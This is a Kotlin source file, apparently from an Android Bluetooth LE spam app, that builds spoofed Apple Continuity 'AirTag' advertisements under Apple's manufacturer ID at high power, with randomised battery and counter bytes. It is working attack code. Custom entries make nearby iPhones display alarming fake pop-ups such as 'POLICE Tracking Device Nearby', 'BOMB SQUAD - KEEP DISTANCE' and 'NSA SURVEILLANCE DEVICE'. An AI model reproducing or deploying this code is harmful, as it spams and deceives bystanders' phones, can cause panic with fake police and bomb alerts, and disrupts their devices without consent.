package de.simon.dankelmann.bluetoothlespam.AdvertisementSetGenerators

import android.bluetooth.BluetoothDevice
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.AdvertisingSetParameters
import android.util.Log
import de.simon.dankelmann.bluetoothlespam.Callbacks.GenericAdvertisingSetCallback
import de.simon.dankelmann.bluetoothlespam.Callbacks.GenericAdvertisingCallback
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertiseMode
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertisementSetRange
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertisementSetType
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertisementTarget
import de.simon.dankelmann.bluetoothlespam.Enums.PrimaryPhy
import de.simon.dankelmann.bluetoothlespam.Enums.SecondaryPhy
import de.simon.dankelmann.bluetoothlespam.Enums.TxPowerLevel
import de.simon.dankelmann.bluetoothlespam.Helpers.StringHelpers
import de.simon.dankelmann.bluetoothlespam.Helpers.StringHelpers.Companion.toHexString
import de.simon.dankelmann.bluetoothlespam.Models.AdvertisementSet
import de.simon.dankelmann.bluetoothlespam.Models.ManufacturerSpecificData
import kotlin.random.Random

class ContinuityNewAirtagPopUpAdvertisementSetGenerator: IAdvertisementSetGenerator {

    private val _logTag = "CustomAirtagGenerator"
    private val _manufacturerId = 76 // 0x004c == 76 = Apple

    // КАСТОМНЫЕ УСТРОЙСТВА
    val deviceData = mapOf(
        "0055" to "POLICE Tracking Device",
        "0030" to "GOV Surveillance Tag",
        "0066" to "Bomb Squad Tracker", 
        "0077" to "Alien Tech Beacon",
        "0088" to "Tesla Security Tag",
        "0099" to "Energy Dept Monitor",
        "00AA" to "NSA Surveillance",
        "00BB" to "Military Grade Tracker"
    )

    // КАСТОМНЫЕ ЦВЕТА
    val colors_custom = mapOf(
        "00" to "Stealth Black",
        "01" to "Tactical Green",
        "02" to "Police Blue", 
        "03" to "Gov Issue Gray",
        "04" to "Urban Camo",
        "05" to "Digital White"
    )

    val deviceColorsMap = mapOf(
        "0055" to colors_custom,
        "0030" to colors_custom,
        "0066" to colors_custom,
        "0077" to colors_custom,
        "0088" to colors_custom,
        "0099" to colors_custom,
        "00AA" to colors_custom,
        "00BB" to colors_custom
    )

    private fun getColorMap(deviceIdentifier: String):Map<String,String>{
        deviceColorsMap.forEach{
            if(it.key == deviceIdentifier){
                return it.value
            }
        }
        return colors_custom
    }

    companion object {
        fun getRandomBudsBatteryLevel():String{
            val level = ((0..9).random() shl 4) + (0..9).random()
            return StringHelpers.intToHexString(level)
        }

        fun getRandomChargingCaseBatteryLevel():String{
            var level = ((Random.nextInt(8) % 8) shl 4) + (Random.nextInt(10) % 10)
            return StringHelpers.intToHexString(level)
        }

        fun getRandomLidOpenCounter():String{
            var counter =  Random.nextInt(256)
            return StringHelpers.intToHexString(counter)
        }

        fun prepareAdvertisementSet(advertisementSet: AdvertisementSet):AdvertisementSet{

            if(advertisementSet.advertiseData.manufacturerData.size > 0){
                var payload = advertisementSet.advertiseData.manufacturerData[0].manufacturerSpecificData

                // randomize random data
                payload[6] = StringHelpers.decodeHex(getRandomBudsBatteryLevel())[0]
                payload[7] = StringHelpers.decodeHex(getRandomChargingCaseBatteryLevel())[0]
                payload[8] = StringHelpers.decodeHex(getRandomLidOpenCounter())[0]

                for (i in 11..26) {
                    payload[i] = Random.nextBytes(1)[0]
                }
            }

            return advertisementSet
        }
    }

    override fun getAdvertisementSets(inputData: Map<String, String>?): List<AdvertisementSet> {
        var advertisementSets:MutableList<AdvertisementSet> = mutableListOf()

        val data = inputData ?: deviceData

        data.forEach{deviceData ->
            val colorMap = getColorMap(deviceData.key)
            val prefix = "05" // NEW AIRTAG

                colorMap.forEach{ color ->

                    var advertisementSet = AdvertisementSet()
                    advertisementSet.target = AdvertisementTarget.ADVERTISEMENT_TARGET_IOS
                    advertisementSet.type = AdvertisementSetType.ADVERTISEMENT_TYPE_CONTINUITY_NEW_AIRTAG
                    advertisementSet.range = AdvertisementSetRange.ADVERTISEMENTSET_RANGE_CLOSE

                    // Advertise Settings
                    advertisementSet.advertiseSettings.advertiseMode = AdvertiseMode.ADVERTISEMODE_LOW_LATENCY
                    advertisementSet.advertiseSettings.txPowerLevel = TxPowerLevel.TX_POWER_HIGH
                    advertisementSet.advertiseSettings.connectable = false
                    advertisementSet.advertiseSettings.timeout = 0

                    // Advertising Parameters
                    advertisementSet.advertisingSetParameters.legacyMode = true
                    advertisementSet.advertisingSetParameters.interval = AdvertisingSetParameters.INTERVAL_MIN
                    advertisementSet.advertisingSetParameters.txPowerLevel = TxPowerLevel.TX_POWER_HIGH
                    advertisementSet.advertisingSetParameters.primaryPhy = PrimaryPhy.PHY_LE_CODED
                    advertisementSet.advertisingSetParameters.secondaryPhy = SecondaryPhy.PHY_LE_CODED
                    advertisementSet.advertisingSetParameters.scanable = true
                    advertisementSet.advertisingSetParameters.connectable = false

                    // AdvertiseData
                    advertisementSet.advertiseData.includeDeviceName = false

                    val manufacturerSpecificData = ManufacturerSpecificData()
                    manufacturerSpecificData.manufacturerId = _manufacturerId

                    var continuityType = "07"
                    var payloadSize = "19"
                    val status = "55"

                    var payload =
                        continuityType +
                        payloadSize +
                        prefix +
                        deviceData.key +
                        status +
                        getRandomBudsBatteryLevel() +
                        getRandomChargingCaseBatteryLevel() +
                        getRandomLidOpenCounter() +
                        color.key +
                        "00"
                    
                    payload += Random.nextBytes(16).toHexString()

                    manufacturerSpecificData.manufacturerSpecificData = StringHelpers.decodeHex(payload)

                    advertisementSet.advertiseData.manufacturerData.add(manufacturerSpecificData)
                    advertisementSet.advertiseData.includeTxPower = false

                    // ⭐⭐ КАСТОМНЫЙ ЗАГОЛОВОК ДЛЯ IOS POP-UP ⭐⭐
                    advertisementSet.title = getCustomNotificationTitle(deviceData.key, color.value)

                    // Callbacks
                    advertisementSet.advertisingSetCallback = GenericAdvertisingSetCallback()
                    advertisementSet.advertisingCallback = GenericAdvertisingCallback()

                    advertisementSets.add(advertisementSet)
                }
        }

        return advertisementSets.toList()
    }

    // ФУНКЦИЯ ДЛЯ КАСТОМНЫХ IOS POP-UP УВЕДОМЛЕНИЙ
    private fun getCustomNotificationTitle(deviceId: String, color: String): String {
        return when (deviceId) {
            "0055" -> "🚨 POLICE Tracking Device Nearby"
            "0030" -> "📡 Government Surveillance Active"
            "0066" -> "💣 BOMB SQUAD - KEEP DISTANCE"
            "0077" -> "👽 UNKNOWN SECURITY DEVICE"
            "0088" -> "🚗 TESLA ANTI-THEFT TRACKER" 
            "0099" -> "⚡ ENERGY DEPARTMENT MONITOR"
            "00AA" -> "🛰️ NSA SURVEILLANCE DEVICE"
            "00BB" -> "🎯 MILITARY GRADE TRACKER"
            else -> "SECURITY DEVICE DETECTED"
        }
    }
}
